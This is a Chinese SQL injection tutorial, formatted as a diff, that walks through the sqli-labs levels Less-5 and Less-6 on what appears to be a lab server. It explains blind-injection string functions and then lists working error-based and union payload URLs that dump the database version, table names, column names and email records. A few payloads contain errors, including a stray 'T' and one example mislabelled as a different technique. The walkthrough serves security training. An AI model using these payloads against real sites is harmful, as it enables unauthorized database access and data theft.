@@ -1,0 +1,133 @@
+写在前面：今天的重点是盲注。
+
+首先介绍一下sql注入截取字符串常用函数有三大法宝。
+
+mid(),substr(),left()
+
+1.mid()函数
+
+MID(column_name,start[,length])
+
+如： str="123456"     mid(str,2,1)    结果为2
+
+Sql用例：
+
+（1）MID(DATABASE(),1,1)>’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。
+
+（2）MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)>’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。
+
+
+2.substr()函数
+
+    Substr()和substring()函数实现的功能是一样的，均为截取字符串。
+
+    string substring(string, start, length)
+
+    string substr(string, start, length)
+
+    参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。
+
+Sql用例：
+
+(1) substr(DATABASE(),1,1)>’a’,查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。
+
+(2) substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)>’a’此处string参数可以为sql语句，可自行构造sql语句进行注入。
+
+3.Left()函数
+
+Left()得到字符串左部指定个数的字符
+
+Left ( string, n ) string为要截取的字符串，n为长度。
+
+Sql用例：
+
+(1) left(database(),1)>’a’,查看数据库名第一位，left(database(),2)>’ab’,查看数据库名前二位。
+
+(2) 同样的string可以为自行构造的sql语句。
+
+参考链接：http://www.cnblogs.com/lcamry/p/5504374.htm
+
+less-5
+
+1.使用left（）爆基本信息。
+
+http://43.247.91.228:84/Less-5/?id=1'and left(version(),1)=5--+
+
+当返回是you are in....时，返回正确的版本号。
+
+http://43.247.91.228:84/Less-5/?id=1'and length(database())=8--+
+
+当返回是you are in....时，返回正确的数据库长度。
+
+2.爆当前用户名数据库等
+
+下面使用基于报错的盲注手注（双注入）payload，如果用基于布尔的和基于时间的盲注最好写一个python脚本，因为实在太耗费时间。（当然了基于报错的盲注也可以使用python脚本，py大法牛逼！）
+
+首先是双查询注入：
+
+http://43.247.91.228:84/Less-5/?id=1' union Select 1,count(*),concat((select database()),floor(rand(0)*2))a from information_schema.columns group by a--+
+
+主要的是聚合函数，count(*)，就是多个东西的结果，count(*)返回的是总行数嘛。
+双注入查询需要理解四个函数/语句
+
+(1). Rand() //随机函数
+
+(2). Floor() //取整函数
+
+(3). Count() //汇总函数
+
+(4). Group by clause //分组语句
+
+参考链接：https://www.2cto.com/article/201303/192718.html
+
+或者利用double 数值类型超出范围进行报错注入
+
+http://43.247.91.228:84/Less-5/?id=1' union Select 1,count(*),concat((select database()),floor(rand(0)*2))a from information_schema.columns group by a--+
+
+或者利用bigint 溢出进行报错注入
+
+http://43.247.91.228:84/Less-5/?id=1' union select (!(select * from (select user())x) - ~0),2,3--+
+
+或者利用xpath 函数报错注入
+
+http://43.247.91.228:84/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+
+
+参考链接：
+考exp 报错文章：http://www.cnblogs.com/lcamry/articles/5509124.html
+bigint 溢出文章http://www.cnblogs.com/lcamry/articles/5509112.html
+
+3.爆数据库security的表
+
+http://43.247.91.228:84/Less-5/?id=1' union select count(*),1, concat('~',(select table_name from information_schema.tables where table_schema='security' limit 0,1),'~', floor(rand()*2)) as a from information_schema.tables group by a%23
+
+只要改limit后面的数字就可以爆出所有的表。
+
+4.爆列
+
+http://43.247.91.228:84/Less-5/?id=1' union select count(*),1, concat('~',(select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),'~', floor(rand()*2)) as a from information_schema.tables group by a%23
+
+同样，改limit后面的数字就可以爆出所有的列。
+
+5.爆数据
+
+http://43.247.91.228:84/Less-5/?id=1' union select count(*),1, concat('~',(select email_id from emails limit 0,1),'~', floor(rand()*2)) as a from information_schema.tables group by a%23  
+
+less-5 over!
+
+less-6
+
+按照less-5的payload，单引号换双引号即可拿到数据。
+less-6 over！
+
+
+
+
+
+
+
+
+
+
+
+
+
